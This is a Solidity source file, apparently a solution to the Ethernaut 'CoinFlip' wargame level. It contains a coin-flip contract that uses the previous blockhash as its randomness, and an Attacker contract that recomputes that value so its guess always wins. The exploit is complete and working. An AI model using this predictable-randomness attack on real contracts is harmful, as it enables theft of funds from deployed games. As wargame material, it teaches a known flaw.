/**
 *Submitted for verification at Etherscan.io on 2022-04-03
*/

pragma solidity ^0.4.18;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function CoinFlip() public {
      consecutiveWins = 0;
    }
    
    function flip(bool _guess) public returns (bool) {
      uint256 blockValue = uint256(block.blockhash(block.number-1));
     
      if (lastHash == blockValue) {
         revert();
      }

      lastHash = blockValue;     
      uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
      bool side = coinFlip == 1 ? true : false;
   
      if (side == _guess) {
         consecutiveWins++;
         return true;
      } else {
         consecutiveWins = 0;
         return false;
      }
    }
 }

contract Attacker {
   CoinFlip cf;
   
   // replace target by your instance address
   address target = 0xD905B7dFc52046f0b730f05431A5e998680e322c;
   uint256 lastHash;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
   function Attacker() {
     cf = CoinFlip(target);
   }
 
   function calc() public view returns (bool){
     uint256 blockValue = uint256(block.blockhash(block.number-1));
    
     if (lastHash == blockValue) {
        revert();
     }
    
     lastHash = blockValue;
     uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
     return coinFlip == 1 ? true : false;
   }

   function flip() public {
     bool guess = calc();
     cf.flip(guess);
   }
 }